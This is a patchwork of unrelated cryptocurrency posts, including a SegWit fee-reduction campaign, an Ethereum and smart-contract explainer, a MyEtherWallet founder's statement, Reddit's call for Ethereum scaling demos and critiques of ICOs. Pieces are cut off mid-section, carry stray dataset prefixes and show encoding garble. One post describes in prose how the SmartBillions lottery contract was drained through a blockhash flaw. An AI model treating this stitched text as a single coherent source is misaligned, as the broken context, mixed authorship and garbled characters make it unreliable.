[On Jan 11 2018 when BTC sends went offline at Coinbase the mempool began to rapidly empty. Later in the day when service was restored there was a sharp spike up in the mempool](https://twitter.com/JordanTuwiner/status/951698069967589376). Subsequently, that afternoon Brian Armstrong finally had to break his silence on the topic and admitted Coinbase is working on SegWit but has still not deployed it. It appears that this is an important data point that indicates if just a few major exchanges would deploy SegWit the high fees bitcoin is experiencing would be eliminated.

SegWit is just one technique available to exchanges and users to reduce pressure on the Bitcoin network. You can make the switch to SegWit on your next transaction, and pressure exchanges to deploy SegWit NOW along with other actions that will reduce their transaction impact on the network. You can help by taking one or more of the action steps below. 

________________


**ACTION STEPS**

1. If your favorite wallet has not yet implemented SegWit, kindly ask them to do so immediately. If your wallet is not committed to implementing SegWit fast, speak out online any way you can and turn up the pressure. In the meantime start using a wallet that has already implemented SegWit.
2. If your favorite exchange has not yet implemented SegWit, try to avoid making any further purchases of bitcoin at that exchange and politely inform them that if they do not enable SegWit within 30-days they will lose your business. Sign-up for an account at a SegWit deployed/ready exchange now and initiate the verification process so you'll be ready to bail
3. Help educate newcomers to bitcoin about the transaction issue, steer them towards SegWit wallets from day one, and encourage them to avoid ever purchasing bitcoin through non-SegWit ready exchanges that are harming bitcoin.
4. Spread the word! Contact individuals, websites, etc that use bitcoin, explain the benefits of SegWit to everyone, and request they make the switch. Use social media to point out the benefits of SegWit adoption.

IMPORTANT NOTE: The mempool is currently still quite backlogged. If you are a long-term holder and really have no reason to move your bitcoins at this time, wait until the mempool starts to clear and transaction fees go down before moving your bitcoins to a SegWit address or SegWit friendly exchange.

**BEYOND SEGWIT - BATCHING, PAYMENT CHANNELS, LIGHTNING**


Batching is another great way that exchanges can reduce their fees. See: [Saving up to 80% on Bitcoin transaction fees by batching payments](https://bitcointechtalk.com/saving-up-to-80-on-bitcoin-transaction-fees-by-batching-payments-4147ab7009fb). Despite the benefits of batching, some exchanges have been slow to implement it. Users should demand this or walk.

Beyond SegWit & Batching, Lightning Network integration will have even more effect. Lightning is now active and exchanges could setup payment channels between each other so that on-chain transactions need not take place. Some ideas have to outline how that might work are here: [Google Doc - Lightning Exchanges](https://docs.google.com/document/d/1r38-_IgtfOkhJh4QbN7l6bl7Rol05qS-i7BjM3AjKOQ/edit). Which two bitcoin exchanges will be the first to establish a lightning channel between themselves and offer free/instant transfers between them for their customers? This will happen in 2018

**FAQs**

###### If I'm a HODLer, will it help to send my BTC to a SegWit address now?

> No, just get ready now so that your NEXT transaction will be to a SegWit wallet. Avoid burdening the network with any unnecessary transactions for now. 

###### Why is SegWit adoption going so slowly? Is it a time-consuming process, is there risk involved, is it laziness, or something else?

> SegWit will require some extra work to be done right and securely. Also, most exchanges let the user pay the fee, and up to now users have not been overly concerned about fees so for some exchanges it hasn't been a priority.

###### Once Segwit is FULLY adopted, what do we see the fees/transaction times going to?

> Times stay the same - fees will go down. How much and for how long depends on what the demand for transactions will be at that time.

###### What determines bitcoin transaction fees, to begin with?

> Fees are charged per byte of data and are bid up by users. Miners will typically include the transaction with the highest fee/byte first. 

###### Can you please tell me how to move my bitcoins to SegWit address in Bitcoin core wallet? Does the sender or receiver matter? 

> The Bitcoin core wallet does not yet have a GUI for its SegWit functionality. Download the latest version of Electrum to generate a SegWit address.

> A transaction between two SegWit addresses is a SegWit transaction. 

> A transaction sent from a SegWit address to a non-SegWit address is a SegWit transaction.

> A transaction sent from a non-SegWit address to a SegWit address is NOT a SegWit transaction. You can send a SegWit Tx if the sending address is a SegWit address.

> [Source: HowToToken](https://howtotoken.com/explained/send-bitcoin-faster-cheaper-SegWit-transactions)

###### What wallet are you using to ""batch your sends""? And how can I do that?

> Using Electrum, the ""Tools"" menu option: ""Pay to many"".

> Just enter your receive addresses and the amounts for each, and you can send multiple transactions for nearly the price of one.

###### Why doesn't the Core Wallet yet support SegWit?
 
> The Core Wallet supports SegWit, but its GUI doesn't. The next update will likely have GUI support built-in
 
###### Why isn't a large exchange like Coinbase SegWit ready & deployed when much smaller exchanges already are? Why do they default to high fees? Where is the leadership there?

> Draw your own conclusions based on their own words: 

> [March 2016 - Coinbase CEO Brian Armstrong has reservations about Core](https://blog.coinbase.com/what-happened-at-the-satoshi-roundtable-6c11a10d8cdf)

**P2SH/bech32 FAQs**

###### What are the two SegWit address formats and why do they exist?

> It's been a challenge for wallet developers to implement SegWit in a way that users can easily and without too much disruption migrate from legacy to SegWit addresses. The first wallets to enable SegWit addresses ‚Äì Ledger, Trezor, Core, GreenAddress ‚Äì use so-called ‚Äúnested P2SH addresses.‚Äù This means they take the existing Pay 2 Script Hash address ‚Äì starting with a ‚Äú3‚Äù ‚Äì and put a SegWit address into it. This enables a high grade of compatibility to exist wallets as every wallet is familiar with these addresses, but it is a workaround which results in SegWit transactions needing around 10 percent more space than they otherwise would.

> Electrum 3.0 was the first wallet to use bech32 addresses instead of nested p2sh addresses.

>  [Source: BTCManager.com](https://btcmanager.com/electrum-3-0-first-wallet-enable-bech32-segwit-addresses/)

###### What is the difference in address format between SegWit address formats P2SH and bech32?

> P2SH starts with ""3...""

> bech32 starts with ""bc1...""
 
###### Which addresses can I send from/to?

Let's give ZDNet the Western Union treatment. Read that article. It's insane. 

from the ""Journalist's"" article:
""Earlier this year, I wrote to a dozen or so key Senators and Congressmen concerning the illegality of Bitcoin in the United States. What makes it illegal is Article 1, Section 8, Clause 5 of the Constitution of the United States. Only the US Treasury can coin currency. If the US government doesn't produce currency, it is illegal. End of story. Now you have the confirmation from a US Senator to prove it.

I originally wrote to these people to have an opportunity to testify in front of Congress against Bitcoin's use in the US as a currency. Bitcoin is only one of a dozen or so illegal currencies, but Bitcoin seems to be the main one to battle against. If that one's defeated, then it would render all of them as worthless, except for their original purpose of illegal purchases of weapons, drugs, and other contraband.

My response from Senator Coburn's office is given below, in its entirety.""

_____________________________________________
By now, most people know Ethereum as the second most valuable cryptocurrency, currently valued at over $60 billion dollars. Well, it turns out that Ethereum isn't actually a cryptocurrency - it's a software platform that let's programmers build applications on top of blockchain technology. Within the ethereum platform, is a cryptocurrency called ether that is used to power applications built on the Ethereum blockchain. 

**From Bitcoin to Ethereum**

Bitcoin uses a global network of computers that maintain a shared ledger called a blockchain that keeps track of who owns bitcoin. Once blockchain technology was introduced to the world, people realized that blockchains could be used to keep track of anything of value. In 2013, a 19 year old named Vitalik Buterin introduced the Ethereum white paper, which proposed an open source platform that would let programmers build blockchain applications that could facilitate the exchange of money, content, property, shares or anything of value. Much like with Satoshi Nakamoto's paper, Buterin's was met with widespread excitement from software developers around the world who began building toward the vision Buterin laid out.

Much like Bitcoin, Ethereum isn't owned or controlled by any one person. Unlike Bitcoin, whose creator remains anonymous, Ethereum has a leader in Vitalik Buterin (pictured below). While Buterin doesn't control Ethereum in the way that a CEO does, his word carries tremendous weight in dictating the direction of the project - something that is considered a strength or a weakness, depending on who you ask.

**Smart Contracts**

The basic function that programs built on Ethereum perform are called smart contracts. Smart contracts are digital agreements that execute automatically based on real world data. An easy way to think of them is an ""If-then statement."" IF condition A exists, THEN perform function B. 

Let's say for example Grandma wants to make sure she never forgets to give Little Billy birthday money each year. She could write a smart contract that says IF it's Little Billy's birthday, THEN pay him $10 from Grandma's account. Once this contract is broadcast to the Ethereum network, it will execute automatically each year on Little Billy's birthday. 

Smart contracts have applications far beyond improving the reliability and efficiency of Grandmothers around the world. Another simple application of a smart contract is for rental payments: IF date = 1st of the month, THEN pay landlord rent amount. Processes that currently involve manual interactions between two parties can now be automated and the value can be moved in real time over the blockchain rather than settling days later as with traditional banking. 

**A Real World Example**

Ethereum and smart contracts are a big deal because they have the ability to usher in what's been dubbed the ""smart economy"" - one in which slow manual processes prone to human error and deceit are replaced with automated processes that are completely transparent and trustworthy. A real world example that typifies the new ""smart economy"" is a project being run by a French insurance company called AXA. 

AXA offers a flight insurance product that pays out a policy holder in the event that a flight is delayed by two hours or more. It currently has a product in trial that will pay out insurance claims using smart contracts and the Ethereum blockchain. The smart contract is simple: IF flight is over two hours late, THEN pay policyholder. The smart contract is connected to a database that monitors flight times. If the database shows that the flight is over two hours late, the smart contract is triggered and the policyholder is paid automatically over the blockchain. 

Without the smart contract, the policyholder would have to file a claim and wait for the insurance company's claims department to process it, which could take anywhere from 1 to 2 weeks. With the smart contract, neither the insurance company nor the policyholder has to do anything. This also creates trust between the two parties because there are no grey areas - the customer can review the smart contract prior to purchasing the policy and feel comfortable that he will receive his claim in the event of a delay. 

**Ethereum vs Ether**

As stated in the intro, Ethereum is a platform for building blockchain applications using smart contracts. What you may have just purchased on Coinbase is called Ether, which is the cryptocurrency that fuels the Ethereum network. 

Ether functions more like a digital commodity than a digital currency. Just like you need gasoline to fuel your car, you need Ether to run applications on the Ethereum blockchain. In the Grandmother example cited above, Grandma would have to purchase small amounts of Ether to fuel her smart contract that pays Little Billy his birthday money. 

The Ethereum blockchain functions in the same way as the Bitcoin blockchain: a network of computers run software that validates transactions through majority consensus. The people running these computers are called miners. Bitcoin miners are compensated for their resources by being paid in Bitcoin. Ethereum miners are compensated in Ether. On Little Billy's birthday, Grandma's ether transaction fee will go to whichever miner adds the block containing Grandma's transaction to the blockchain. That miner will also receive new Ether in the process.

The same supply/demand economics that apply to commodities like oil and gas also apply to Ether. Oil is valuable because it powers many of the things we use in our everyday life - it heats our homes and fuels our engines. The more people and enterprises that rely on Ethereum based applications, the higher the demand will be for Ether which will increase its value. As with all cryptocurrencies, there's plenty of speculation baked into the price - speculation that the demand for Ether will increase in the future. Since Ether is valuable, exchangeable and transferable, certain merchants are also starting to accept it as a currency. 

**dApps - Decentralized Apps**  

Applications that run smart contracts on the Ethereum blockchain are called ""dApps,"" or decentralized apps. Just as any app developer can build apps on top of Apple's IOS operating system, developers can build on top of Ethereum's blockchain infrastructure. To the end user of a dApp, it might not look and feel any different than the apps you use today. It's the underlying blockchain infrastructure that make them different. 

Since dApps function on top of the blockchain, they can be used to transfer value peer-to-peer. To return to our Grandmother example, there could be a dApp that Granny can download that lets her schedule Little Billy's birthday payments without having to code the smart contract herself. dApps are also completely open sourced so other people can access the code and build on top of them. Someone could take the code to the birthday payment dApp and add the ability for Grandma to add a note that says, ""Happy Birthday Billy!"" Running dApps on the blockchain also offers added security benefits. Since the transactions are distributed and encrypted across the Ethereum blockchain, there is no central place for a hacker to breach and gain access to all of the world's Grandmother to grandson birthday payment data. 

At this point, I'm really beating the Grandmother/Little Billy example to death because I think it represents a simple illustration for the kinds of applications that can be built on the Ethereum blockchain. In reality, the dApps that are being built are much more complex. Here are a few examples: 

* **Weifund - blockchain crowdfunding:** Users can launch traditional crowdfunding campaigns, but through the use of smart contracts, backers can gain a financial stake in the project. If an indie film gets funded on Weifund, a backer who financed 10% of the project can collect 10% of the film's revenues. Payments will be issued in real time as the film generates revenue. 
* **Ujo Music - Music licensing via the blockchain:** An artist can create an original song and register it on Ujo's platform and set their own licensing terms. If a film producer wants to use that song in a movie, they can purchase the rights based on the terms set by the artist who will then get paid directly. This erases the need for industry middlemen like Warner Brothers who end up taking the lion's share of their artist's profits. 
* **Virtue Poker - Online poker secured by the blockchain:** At the height of it's popularity, online poker platforms like PokerStars were marred with issues that ranged from deck rigging to the abuse of player funds held by the company. Virtue Poker using Ethereum allows players to fund their bets directly, insuring that no central party can access and misappropriate player money. Their code is open sourced so that users can understand how hands are dealt, insuring that no one can rig the deck. Lastly, players are paid out their winnings in real time over the blockchain so no more waiting weeks for a check to come in the mail. 

**Ethereum Tokens**

So now that you understand that Ethereum is a network for building decentralized applications that require a cryptocurrency called Ether to run, I'm going to introduce a confusing concept. Many dApps built on Ethereum have their own cryptocurrencies or ""tokens."" In order to interact with the dApps, customers need to purchase the dApp's native token. 

Here's a helpful analogy I came across - when you go to a waterpark, you pay the admission fee and in return, you get a wristband. That wristband gives you the ability to ride the waterslides in the water park. With certain dApps, the token is the wristband, and a user must purchase it to interact with whatever the dApp offers. 

Let's take a dApp called Golem as an example. Golem lets people rent out their excess computing power to people who need it - kind of like a computer AirBnb. To cite this article from Laura Shin, if I'm a computer graphics artist that wants to render some kind of computationally intense animation, I can purchase Golem tokens that let me tap into the Golem network to generate my animation. I then pay the people who are renting me their computers with the Golem tokens. The Golem token is a form of smart contract and this transaction is recorded on the Ethereum blockchain. 

Since Golem tokens are also a cryptocurrency, they can be traded on the free market. If I'm a speculator who has no intention of using the Golem network to rent computing power, I can still buy the Golem token on an exchange in hopes that it appreciates in value. Like bitcoin, there is a fixed supply of Golem tokens so if the demand for the service increases, so will the value of the token. If I bought Golem at its original price of around 1 penny and held it to today, I would have made 35X my initial investment since Golem tokens currently trade around 35 cents a piece. 

**ICOs**

ICO stands for, ""Initial Coin Offering"" which is a fundraising mechanism for cryptocurrencies which has exploded in popularity this year - the majority of them are held on the Ethereum network. Similar to a kickstarter campaign, they allow entrepreneurs to raise money for projects by giving investors an early opportunity to purchase the cryptocurrency before the final product has been built. If the project is successful, the value of the cryptocurrency will rise in value and early investors can sell it on the open market for a profit.

ICOs have stirred up a lot of controversy because they represent a risky proposition with zero investor protection. Let's say I wanted to build a casino and to finance it, I gave investors the opportunity to buy chips that can be used at my roulette tables once the casino opened. If you bought $100K in roulette chips from me and I decide that I no longer want to build the casino, you're stuck holding worthless chips. If investors don't do their due diligence, they may end up buying tokens for a project whose creators never intended on building it in he first place - the creators walk away with the money and the investors have no way of recouping their funds. 

On the other hand, early investors in projects that go on to be successful have the opportunity to make enormous returns. For example, people who invested $1,000 in the Golem ICO would be sitting on $35,000 at it's current price of $0.35 - if it ever goes to $10, they're all millionaires. Another positive aspect of ICOs is that they let anyone, rich or poor get involved in early stage investing. To invest in a company like Twitter or Facebook pre-IPO (initial public offering), you need to be an accredited investor - this basically means you're already a rich person. With ICOs, all you need is an internet connection and a little bit of money and you have the potential to become wealthy by investing in the right projects.

**Far From Perfect**

Ethereum has the potential to change the way humans transact with one another but it is still a very young technology and it hasn't been without its problems. While the blockchain architecture underlying the Ethereum network is secure, not all of the applications built on top of it are. Faulty code can and has made applications vulnerable to hacking and malfunctions. Here are two prime examples: 

**DAO Hack** - DAO was a dApp built on Ethereum that enabled crowd based venture capital. DAO token holders were given the right to vote on projects they wanted to support - if projects went on to be successful, DAO token holders would receive financial rewards. The DAO ICO received $168 million in funding. The DAO software was hosted on the Ethereum blockchain and was publically visible by all. A hacker spotted a flaw in the DAO's code that enabled him to route $55M in ether held by the DAO into an account that he controlled. The Ethereum team had do do something called a hard fork (something I won't get into now) to reverse return the stolen funds.
**Parity Wallet Freeze** - Parity is a wallet where people store Ether. A flaw in Parity's code let a user delete a specific line of code that was necessary for accessing funds in a Parity wallet. This led to $280 million dollars worth of ether being frozen - it hasn't been stolen but it can't be accessed either. Parity Technologies has proposed another hard fork to correct the issue - something that is sure to divide the Ethereum community and rattle user confidence. 

Despite the world changing implications that Ethereum dApps and smart contracts have, the trouble is that any programmer can write them - if they aren't written properly, they can behave in unintended ways and be exploited like in the above listed examples. Ethereum is still a very young network and security issues with dApps and smart contracts will have to be sorted out if its to reach its true aspirations. 

**Leading The Decentralized Revolution**

‚ÄúEthereum aims to take the promise of decentralization, openness and security that is at the core of blockchain technology and brings it to almost anything that can be computed.‚Äù - Vitalik Buterin 

With dApps, smart contracts and blockchain technology, Ethereum is leading the decentralized revolution. Bitcoin is the world's first decentralized currency, that operates on a global network of computers outside of central intermediaries. Ethereum gives programmers a platform to develop a decentralized version of just about anything.

Decentralized networks like Ethereum have the power to remove the intermediaries that currently exist between producer and consumer. Let's take a company like Uber. Uber is a platform that brings people who need rides together with people who have cars. To facilitate this interaction, Uber collects 20% of every ride. With Ethereum and blockchain technology, there is nothing to prevent a bunch of software developers from writing a dApp that creates a decentralized Uber. Instead of 20% per ride, transaction fees are paid to the network and the driver takes home the lions share of the transaction. Tokens can be issued that represent ownership in the network. Coders who work on improving the network can get paid for their efforts in ownership tokens. Non-technical people can come up with marketing campaigns that spread awareness for the network and also get compensated in ownership tokens. As the decentralized Uber network grows and improves, the value of its ownership token increases, rewarding the people that built it. The result is whats referred to as a ""Decentralized Autonomous Organization"" and theres a strong possibility that DAOs replace a lot of the world's biggest corporations. 

This may sound like a radical concept but blockchain technology enables these kinds of decentralized organizations to exist - Ethereum provides the tools for people to go out and build them."

To remove the network speed from the performance equation I downloaded the bare blockchain separately and synced the node from disk. As it's only 20GB at the moment there would be no noticeable difference.  
23k most recent blocks were downloaded after that. 

The fully synced node with all historical blocks + recent state (ie. exactly like a full bitcoin node) uses 44.3GB.

By now, you may have already read the article at [medium](https://medium.com/mycrypto/mycrypto-launch-6a066bf41093). For those of you who do not know me, I founded MyEtherWallet (‚ÄúMEW‚Äù), and I believe that I owe our Ethereum community, and the crypto community at large, an explanation of yesterday‚Äôs events.


Before I do, a brief history about me: I‚Äôve been intrigued by Ethereum ever since the release of their yellow paper back in 2014. Upon reading it, I realized that Vitalik was a true visionary and became infatuated with the technology behind Ethereum. Specifically, I understood all the transformative possibilities that this type of technology presented now and in the future. When the Ethereum Foundation released the ‚ÄúMainnet,‚Äù however, I recognized that many users were struggling. With no graphical user interface, many early adopters were having difficulty accessing and transferring their Ether. I saw an opportunity to contribute to this new, emerging community, and seized it. 

 

I began working on a user interface to be used in conjunction with, and in support of, Ethereum wallet functionality that any new crypto adopter could feel comfortable using. I released my initial version, and published it on [Reddit](https://www.reddit.com/r/ethereum/comments/3gkknd/ether_wallet_generator_for_now/) on August 11, 2015 (MEW‚Äôs birthday!). I designed it to be open source so that others like me could make modifications to my existing codebase, and continue improving user-friendliness and functionality over time.



However, as a core developer and programmer, business development/designing were, admittedly, not my strength. I needed someone to take the lead on that front if I wanted MEW to grow its userbase. I brought my friend, Taylor M., on board knowing that she was up to the task. Let‚Äôs just say that she did not disappoint, and MEW took off much faster than either of us could have anticipated. I will always be appreciative of her efforts in helping MEW achieve the success it did.



Alas, for reasons I cannot delve into here, our partnership had to end. During the transition yesterday, however, MEW‚Äôs Twitter account was switched from @myetherwallet to @mycrypto, and tens of thousands of MEW followers were left scratching their heads. Indeed, the change was unexpected, and I‚Äôm still in the process of determining the justification behind the switch, and how this issue will be resolved. I don‚Äôt know what the fall out from this will be ultimately, but I will not be on the offensive or defensive discussing the circumstances surrounding our decision to separate beyond my statement here.



Instead, my focus will be (as it‚Äôs always been) on how best to improve MEW for existing and prospective users. Security is paramount these days, and me and my new team will remain vigilant in ensuring that the MEW website, your accounts, and more importantly, your ether and tokens, are safe. Rest-assured that MEW is the same product that you trusted yesterday, and the MEW team will work tirelessly to make sure it is the product you still trust tomorrow. The Ethereum community inspired me to create MyEtherWallet, and it still inspires me today. I am not going anywhere. Furthermore, for those of you wondering where I‚Äôve been or what I‚Äôve been working on the past several months, I‚Äôve been busy doing what I do best‚Äîso get ready for some new and exciting products/services in the pipeline. Stay tuned!



In any event, I must admit that competition is a good thing because it serves as a driving force behind innovation. Look at the world around us. Complacency simply means one will get left behind. That being said, I sincerely wish Taylor M. and MyCrypto the very best. Your presence in the crypto space will undoubtedly motivate me to continue raising the bar.



Thank you all for your support over the last few years, and hopefully, in the years to come. MEW‚Äôs team remains committed to you, and is available to answer any and all questions or concerns you may have. 



Truly yours,  
Kosala H.

0,ethereum,"WARNING! SCAM ICO!! Othor.org list Vitalik as a team member. DO NOT SEND FUNDS TO OTHOR.ORG STAY SAFE I noticed this ICO pop up on a couple of my social media feeds so went and had a look, mainly because they are lauding Vitalik Buterin as a team member...

The website to be fair is half decent and could reel in some unwitting newbies but i also remember Vitalik stating he was distancing himself from any new projects going forward so i was skeptical.. 

Then i watched 'their' promo video, which if you take the 1:40 to watch it (youtube link below) you will see that whenever the company name is mentioned the audio cuts out. Not sure which project the vid is from but its not this one!!! PLUS, would an ICO like this be under the radar.....? no.

Thought i should share this so that people aren't duped into sending money to a scam ICO.

If i have this wrong, please convince me otherwise, but this is super shady IMO.

**tl;dr: Do you believe your Ethereum scaling technology can handle Reddit's scale? It's time to let the Ethereum community hear about it. Send your demo by July 31, 2020.**

This is your chance to earn some fame but, to be clear, there is no prize if your solution is chosen or modified to meet Reddit‚Äôs needs. Our lawyer made us write this.

https://preview.redd.it/q7hhi6lzlp551.png?width=1200&format=png&auto=webp&s=cdb26cbbe59e26f4fc73da5740da1308e2a87579

# The Goal

In conjunction with the Ethereum Foundation, Reddit is inviting Ethereum scaling projects to show the community how your scaling solution can be used to bring [Community Points](http://reddit.com/community-points) to mainnet. Our goal is to find a solution that will support hundreds of thousands of Community Points users on mainnet today, and can eventually scale to all of Reddit (430 million monthly users).

We‚Äôve evaluated some of the most promising scaling solutions, and have learned a few things:

1. There are plenty of awesome projects that we don't know about yet. We seem to learn about a promising new scaling solution every day.
2. Most existing scaling solutions focus on the exchange use case, which favors optimizing for transfers. Many of these designs don't take into consideration the costs of obtaining tokens or entering the scaling system, which can be significant. Community Points distributions have cost an order of magnitude more gas than all other operations combined, primarily due to on-chain storage costs associated with onboarding new users.
3. It's unclear how to determine the best solution. There is a lot of code, a lot of documentation, and a lot of hype out there. But there are very few objective real-world reviews or comparisons of various products/implementations.
4. We need the Ethereum community's help to figure this out.

Do you have a scaling project that meets the criteria below? If so, share your demo by **July 31, 2020.** Please note that all demos need to simulate Community Points usage for 100,000 users.

We also invite all scaling experts in the Ethereum community to comment on any demos submitted to enable a better understanding of the trade-offs and compromises between different solutions.

We will review the demos and plan to share any updates by September. While we don‚Äôt expect any novel scaling projects, we hope that you, the Ethereum scaling expert, can show us how to scale Community Points.

**Demos should include:**

1. A live proof of concept showing hundreds of thousands of transactions
2. Source code (for on & off-chain components as well tooling used for the PoC). The source code does not have to be shared publicly, but if Reddit decides to use a particular solution it will need to be shared with Reddit at some point
3. Documentation
   1. How it works & scales
   2. Cost estimates (on-chain and off-chain)
   3. How to run it
   4. Architecture
   5. APIs (on chain & off)
   6. Known issues or tradeoffs
4. Summary of cost & resource information for both on-chain & off-chain components used in the PoC, as well as cost & resource estimates for further scaling. If your PoC is not on mainnet, make note of any mainnet caveats (such as congestion issues).

# Requirements

**Scaling.** This PoC should scale to the numbers below with minimal costs (both on & off-chain). There should also be a clear path to supporting hundreds of millions of users.

* Over a 5 day period, your scaling PoC should be able to handle:
   * 100,000 point claims (minting & distributing points)
   * 25,000 subscriptions
   * 75,000 one-off points burning
   * 100,000 transfers

**Decentralization.** Solutions should not depend on any single third-party provider.

* We prefer solutions that do not depend on specific entities such as Reddit or another provider, and solutions with no single point of control or failure in off-chain components, but recognize there are numerous trade-offs to consider

**Usability.** Scaling solutions should have a simple end user experience.

* Users shouldn't have to maintain any extra state/proofs, regularly monitor activity, keep track of extra keys, or sign anything other than their normal transactions
* Transactions complete in a reasonable amount of time (seconds or minutes, not hours or days)
* Free to use for end users (no gas fees, or fixed/minimal fees that Reddit can pay on their behalf)
* Bonus points:
   * Users should be able to view their balances & transactions via a blockchain explorer-style interface
   * Exiting is fast & simple

**Interoperability.** Compatibility with third party apps (wallets/contracts/etc) is necessary.

* Scaling solutions should be extensible and allow third parties to build on top of it
* APIs should be well documented and stable
* Documentation should be clear and complete
* Third-party permissionless integrations should be possible & straightforward
* Simple is better. Learning an uncommon or proprietary language should not be necessary. Advanced knowledge of mathematics, cryptography, or L2 scaling should not be required. Compatibility with common utilities & toolchains is expected.
* Bonus Points: Show us how it works. Do you have an idea for a cool new use case for Community Points? Build it!

**Security.** Users have full ownership & control of their points.

* Balances and transactions cannot be forged, manipulated, or blocked by Reddit or anyone else
* Users should own their points and be able to get on-chain ERC20 tokens without permission from anyone else
* Points should be recoverable to on-chain ERC20 tokens even if all third-parties involved go offline
* A public, third-party review attesting to the soundness of the design should be available
* Bonus points:
   * Public, third-party implementation review available or in progress
   * Compatibility with HSMs & hardware wallets

**Other Considerations**

* Minting/distributing tokens is not performed by Reddit directly \[1\]
* One off point burning, as well as recurring, non-interactive point burning (for subreddit memberships \[2\]) should be possible and scalable
* Fully open-source solutions are strongly preferred

\[1\] In the current implementation, Reddit provides signed data for claims, but does not submit the actual claim transaction for the user (the user does that themselves). Note that smart contracts are considered independent of Reddit provided there is a path to decentralizing control over them.

\[2\] Subreddit memberships are currently implemented as a contract acting as an ERC777-style operator that can burn points on a monthly basis, but we are open to changing that implementation.

# Community Points Overview

To help you get started, this is an overview of how [Community Points](https://www.reddit.com/community-points/) work today and some stats on how it's used. We are open to changing most implementation details, provided the basic requirements (above) are met.

## Usage stats over the past month

Number of Community Points holders: \~17,500

Number of transfers: \~20,000

(reference: reddit.dappradar.com)

Number of subreddit memberships: \~800

## Contracts

Community Points is built around 3 contracts:

1. SubredditPoints: the ERC20 token
2. Distributions: manages token supply & token claims
3. Subscriptions: enables membership subscriptions in the form of recurring token burn

## Points Distribution & Claims

Token supply is controlled by distribution rounds managed in the Distributions contract and triggered by Reddit. For each round (occurring \~monthly), Reddit submits a proposal for points distribution to a subreddit for approval. Once approved, Reddit issues signed claims for individual users according to the agreed upon points distribution. These claims can be redeemed on-chain. Claims are obtained from Reddit, and submitted to the Distributions contract, which validates the claim and calls the Subreddit Points contract to mint points.

## Memberships

Subreddit memberships are obtained by burning points via the Subscriptions contract. Redditors can optionally configure their membership to be renewable on a monthly basis without additional interaction. The Subscriptions contract is granted permission to burn points by being configured as an ERC777-style default operator in the Subreddit Points contract.

0,ethereum,"SmartBillions lottery contract just got hacked! Someone made it in the ‚Äúhackathon‚Äù (lol). The hacker could withdraw 400 ETH before the owners, who wrote ‚Äúthe successful hacker keeps ALL of the 1500 ETH reward‚Äù, withdrew quickly the remaining 1100 ETH, that happened 5min before the next transaction (from the ‚Äúhacker‚Äù) would have emptied the whole contract. So that‚Äôs already a lie from their side. The other point is that the owners were able to withdrew ALL contract funds; which in theory they could have done after ICO and run with all the investor money. They always remained anon, which also shows there weren‚Äôt good intentions in first place. 

How did it happen? Their lottery functions were flawed, if you place a bet (systemPlay() function) with betting on number value ‚Äú0‚Äù and then call the won() function after 256+ blocks (after you placed the bet) the returning value will be ‚Äú0‚Äù so you would have bet on ‚Äú000000‚Äù and result would be ‚Äú000000‚Äù and baaam you have the jackpot. The lucky guys first bet was ‚Äú1‚Äù so ‚Äú000001‚Äù and result after 256+ blocks calling won() would be ‚Äú000000‚Äù so he matched 5 correctly which is 20000x and with 0.01ETH bet amount a win of 200ETH. He managed to pull that 2 time and corrected to ‚Äú0‚Äù and for that transaction he had to wait for 256+ blocks, but 5 min before he could call won() the owners withdraw all funds. 


Moral of the story, that ICO was a scam seeing the owners remains anon all the time AND were able to withdraw all contract funds (doing that after ICO would have been fatal for investors). 

They thought they are clever, building a honeypot for investors but at the end their poor coded contract caused them damage of 400ETH and no damage to potential investors.

0,ethereum,"[Mod Request] Can we clean up the sub and get back to technical threads only? And I mean really technical. Too many thinly veiled ICO/Poject pump threads. Even if it means we have fewer topics, ICOs and Project chatter need to to find their own places to shill.

r/ethereum should be for EIPs, Dev Updates, Questions from new and old timers and politicking about gas prices (or whatever is of flavour of the month wrt scaling, casper, technical hurdles, etc.).

 - It should not be about OmiseGo, although it can be about Plasma implementaions / progress / testnets.
 - It should not be about Augur, although it could be about futarchy and game theory.
 - It should not be about MakerDAO, but it could be about the design of stable coins.

More policing in here is needed. We're closing in on Eternal September and Up/Down votes aren't cutting it anymore. The old timers are getting tired of reading drivel and the newcomers are getting the wrong impression about what this sub is for.

Perhaps, new and more active mods on the roster would assist, along with some clearer rules (like if the project name is in the title, it's probably an advertisement and not about the tech, or something to that effect)."

""2017 really has been the year where hype in crypto, including financial hype and social hype in general has far exceeded the reality of what existing blockchain systems can offer. There is a lot of attention, and a lot of eager expectation, but as far as reality goes the practical usability of blockchains has in some cases even regressed due to rising transaction fees.

I expect 2018, at least within the Ethereum space that I‚Äôm best able to speak about, will be the year of action. **It will be the year where all of the ideas around scalability, Plasma, proof-of-stake, and privacy that we have painstakingly worked on and refined over the last four years are finally going to turn into real, live working code** that you can play around in a highly mature form in some cases on testnets, and in some key cases even on the public mainnet. **Everyone in the Ethereum space recognizes that the world is watching, and we are ready to deliver.**""

0,ethereum,"ICOs are an illusion of progress. They produce tokens we don't need, incentivize marketing and speculation over development, and neglect end-user utility. ICOs incentivize developers to increase coin value, but that's not the same thing as producing useful tools or effective dapps. Thus, the coins keep coming, but they generally don't add any real utility.

MakerDAO ~~and EtherDelta are~~ is the only project I can think of that provide real use-cases *today* and used an ICO to get there. When I asked the community for more examples, [the response was not encouraging](https://www.reddit.com/r/ethereum/comments/80bvc0/what_are_some_useful_dapps_that_work_today_are/).

On the other hand, consider dapps like CryptoKitties, Gitcoin, and Toastycoin, all of which launched without an ICO.

- CryptoKitties truly broke new ground, giving every Ethereum user access to a genre of entertainment we don't even have a name for yet--some bizarre marriage of day-trading and beanie babies. For the first time, I was able to show people in the real world a working dapp that was *fun*, to the point where they downloaded MetaMask and put some ether on it. That's a pretty big deal.

- Gitcoin has created a two-sided market out of nowhere, allowing developers and freelancers in OSS to accelerate projects and make money, respectively. Again, Ethereum users now have access to a new, useful economic tool that didn't exist before. It represents a huge step forward in solving the funding problem of open source development.

- Toastycoin (full disclosure: my project) used novel game theory to outsource arbitrary tasks to reliable strangers while dissuading scammers, all automatically. The Ethereum ecosystem now has access to a generalized, unscammable task outsourcing mechanism, which has been proven to work and is unhindered by licensing restrictions.

How many ""game coin"" ICOs have we seen? And yet it was CryptoKitties alone that was so fun it clogged Ethereum *for a week*. How many ICOs talk about service marketplaces? And yet gitcoin is quietly listing [25 open tasks](https://gitcoin.co/explorer?q=) just waiting for developers to claim them (edit: and over 100 finished tasks!), and Toastycoin generalizes the idea further to apply to any small task one human could perform for another.

Even better: none of these products require the user to go buy some shit coin on some random exchange they've never heard of. They just need ether and MetaMask, and they've got virtual kitties. Boom.

